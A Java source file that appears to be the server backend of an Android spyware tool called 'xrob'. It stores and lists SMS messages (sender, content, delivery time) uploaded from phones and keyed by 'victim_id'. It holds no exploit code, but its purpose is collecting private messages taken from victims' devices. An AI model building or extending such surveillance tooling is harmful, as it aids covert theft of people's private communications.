package com.theah64.xrob.api.database.tables;


import com.sun.istack.internal.Nullable;
import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.Message;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by theapache64 on 9/4/16.
 */
public class Messages extends BaseTable<Message> {

    private static final String COLUMN_CONTENT = "content";
    private static final String COLUMN_DELIVERY_TIME = "delivery_time";
    public static final String COLUMN_VICTIM_ID = "victim_id";
    private static final String COLUMN_ANDROID_MESSAGE_ID = "android_message_id";
    private static final String COLUMN_TYPE = "_type";
    private static final String COLUMN_FROM = "_from";
    public static final String TABLE_NAME_MESSAGES = "messages";
    private static Messages instance = new Messages();

    public Messages() {
        super(TABLE_NAME_MESSAGES);
    }

    public static Messages getInstance() {
        return instance;
    }


    @Override
    public void addv2(@Nullable String victimId, JSONArray jaArr) throws RuntimeException, JSONException {

        final String existenceQuery = "SELECT id FROM messages WHERE _from = ? AND content = ? AND delivery_time = ? AND _type = ? AND victim_id = ? AND android_message_id = ? LIMIT 1";
        final String addQuery = "INSERT INTO messages (victim_id,android_message_id,_from,content,_type,delivery_time) VALUES (?,?,?,?,?,?);";

        final java.sql.Connection con = Connection.getConnection();

        try {
            final PreparedStatement addPs = con.prepareStatement(addQuery);
            final PreparedStatement existencePs = con.prepareStatement(existenceQuery);


            //Saving inbox message

            for (int i = 0; i < jaArr.length(); i++) {

                final JSONObject joMessage = jaArr.getJSONObject(i);

                final int androidMessageId = joMessage.getInt(COLUMN_ANDROID_MESSAGE_ID);
                final String content = joMessage.getString(COLUMN_CONTENT);
                final String type = joMessage.getString(COLUMN_TYPE);
                final String from = joMessage.getString(COLUMN_FROM);
                final long deliveryTime = joMessage.getLong(COLUMN_DELIVERY_TIME);


                //Checking existence
                existencePs.setString(1, from);
                existencePs.setString(2, content);
                existencePs.setLong(3, deliveryTime);
                existencePs.setString(4, type);
                existencePs.setString(5, victimId);
                existencePs.setInt(6, androidMessageId);

                final ResultSet rs = existencePs.executeQuery();
                final boolean isExists = rs.first();
                rs.close();

                if (!isExists) {
                    addPs.setString(1, victimId);
                    addPs.setInt(2, androidMessageId);
                    addPs.setString(3, from);
                    addPs.setString(4, content);
                    addPs.setString(5, type);
                    addPs.setLong(6, deliveryTime);

                    if (addPs.executeUpdate() != 1) {
                        //Failed to add
                        throw new RuntimeException("Failed to add " + joMessage);
                    }
                }

            }

            addPs.close();
            existencePs.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

    }

    @Override
    public List<Message> getAll(String victimId, String type) {
        List<Message> messages = null;
        final java.sql.Connection con = Connection.getConnection();

        try {
            final PreparedStatement ps = con.prepareStatement("SELECT _from, content, delivery_time, UNIX_TIMESTAMP(last_logged_at) AS unix_epoch FROM messages WHERE victim_id = ? AND _type = ? ORDER BY delivery_time DESC;");

            ps.setString(1, victimId);
            ps.setString(2, type);

            final ResultSet rs = ps.executeQuery();
            if (rs.first()) {
                messages = new ArrayList<>();

                //Looping through each message
                do {
                    final String from = rs.getString(COLUMN_FROM);
                    final String content = rs.getString(COLUMN_CONTENT);
                    final long deliveryTime = rs.getLong(COLUMN_DELIVERY_TIME);
                    final long syncedTime = rs.getLong(COLUMN_AS_UNIX_EPOCH);

                    messages.add(new Message(from, null, content, deliveryTime, syncedTime));

                } while (rs.next());
            }

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
        return messages;
    }
}
